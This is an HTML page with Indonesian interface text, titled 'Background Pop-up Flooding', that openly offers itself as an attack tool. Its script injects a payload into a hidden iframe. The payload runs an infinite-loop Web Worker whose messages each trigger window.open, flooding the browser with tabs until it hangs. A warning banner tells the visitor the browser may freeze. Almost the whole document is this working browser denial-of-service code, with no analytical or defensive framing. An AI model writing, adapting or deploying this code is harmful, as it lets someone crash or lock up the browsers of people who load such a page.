<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Background Pop-up Flooding</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 600px; width: 100%; border: 1px solid #333; }
h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; animation: pulse 0.5s infinite; }
p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #fff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
button:disabled { background: #555; }
#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; background: #111; padding: 10px; border-radius: 6px; }
.warning { background: #331111; color: #ff4444; padding: 10px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; border: 1px solid #ff4444; }
@keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.5; } }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <div class="warning">⚠️ PERINGATAN: Proses akan berjalan di latar belakang. Browser Anda mungkin akan hang secara tiba-tiba!</div>
    <h1>Background Flooding</h1>
    <p>Menjalankan serangan Pop-up Flooding di dalam Iframe tersembunyi.</p>
    
    <button id="start-btn" type="button">Mulai Serangan Latar Belakang</button>
    <div id="status" role="status">Sistem siap.</div>
</div>

<script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");
    let isRunning = false;

    startBtn.addEventListener("click", () => {
        if (isRunning) return;
        isRunning = true;
        startBtn.disabled = true;
        
        statusDiv.textContent = "Menjalankan serangan di latar belakang...";
        statusDiv.style.color = "#ff4444";

        // 1. Buat Iframe Tersembunyi
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);

        // 2. Suntikkan Payload ke dalam Iframe
        const iframeDoc = iframe.contentWindow.document;
        iframeDoc.open();
        iframeDoc.write(`
            <!DOCTYPE html>
            <html>
            <body style="background:transparent;">
                <script>
                    // Kode Worker: Infinite Loop
                    const workerCode = \`
                        self.onmessage = function(e) {
                            if (e.data === 'START') {
                                while(true) {
                                    self.postMessage('OPEN');
                                }
                            }
                        };
                    \`;
                    
                    try {
                        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
                        const worker = new Worker(URL.createObjectURL(workerBlob));
                        
                        // Terima sinyal dan buka tab
                        worker.onmessage = function(e) {
                            if (e.data === 'OPEN') {
                                queueMicrotask(() => {
                                    try {
                                        window.open('https://google.com', '_blank');
                                    } catch(err) {}
                                });
                            }
                        };
                        
                        worker.postMessage('START');
                    } catch(e) {}
                <\/script>
            </body>
            </html>
        `);
        iframeDoc.close();
        
        statusDiv.textContent = "Serangan berjalan! Jangan tutup tab ini.";
        statusDiv.style.color = "#4CAF50";
    });
</script>
</body>
</html>
